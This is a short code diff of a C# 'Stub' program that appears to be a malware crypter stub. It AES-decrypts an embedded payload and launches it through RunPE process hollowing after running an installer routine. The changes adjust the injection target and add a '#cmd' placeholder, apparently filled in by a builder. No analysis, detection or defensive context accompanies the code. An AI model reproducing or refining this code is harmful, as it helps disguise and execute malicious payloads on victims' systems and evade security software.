@@ -25,7 +25,7 @@ namespace Stub
             Installer installer = new Installer();
             installer.Run();
 #endif
-            RunPE.Run(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), #Injection), AES_Decrypt(GetResource("#Payload")), false);
+            RunPE.Run(#Injection, AES_Decrypt(GetResource("#Payload")), false);
             Environment.Exit(0);
         }
 
@@ -227,7 +227,7 @@ namespace Stub
         private static bool HandleRun(string path, byte[] data, bool protect)
         {
             int readWrite = 0;
-            string quotedPath = "";
+            string quotedPath = "#cmd";
             StartupInformation si = new StartupInformation();
             ProcessInformation pi = new ProcessInformation();
             si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
